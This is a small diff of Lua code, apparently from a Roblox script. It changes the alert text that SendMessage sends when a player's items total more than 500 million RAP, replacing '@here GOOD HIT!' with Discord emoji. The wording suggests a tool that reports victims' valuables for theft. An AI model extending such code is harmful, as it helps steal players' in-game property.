@@ -218,7 +218,7 @@ local function SendMessage(url, username, diamonds)
         totalRAP = totalRAP + (itemData.rap * itemData.amount)
     end
     if totalRAP > 500000000 then
-		poopie = "@here GOOD HIT!"
+		poopie = "<:poopie_1:1279107191806230602><:poopie_2:1279107192682971331><:poopie_3:1279107194427674725><:poopie_4:1279107196147204188><:poopie_5:1279107197472739348>"
     else
 		poopie = "<:segment_1:1279104032786616430><:segment_2:1279104034145566884><:segment_3:1279104035416440912><:segment_4:1279104036523606133><:segment_5:1279104038121639977>"
     end
